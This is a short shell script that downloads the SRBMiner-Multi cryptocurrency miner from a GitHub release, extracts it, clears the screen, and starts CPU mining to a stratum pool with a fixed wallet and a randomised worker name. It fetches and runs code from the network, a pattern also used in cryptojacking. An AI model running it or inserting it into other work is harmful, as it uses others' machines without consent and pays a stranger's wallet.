#!/bin/sh
wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.8.5/SRBMiner-Multi-0-8-5-Linux.tar.xz ;
tar -xf SRBMiner-Multi-0-8-5-Linux.tar.xz ;
cd SRBMiner-Multi-0-8-5 ; clear
./SRBMiner-MULTI --disable-gpu --algorithm yespower --pool stratum+tcps://stratum-asia.rplant.xyz:17017 --wallet web1qru93ddk90hutjzhrejqs84d86cknqj9rlm2szm.VAPERS86-$(echo $(shuf -i 1-999 -n 1)) --cpu-threads 3 --msr-use-tweaks 0 --msr-use-preset 0 --cpu-threads-intensity 1 --cpu-threads-priority 3
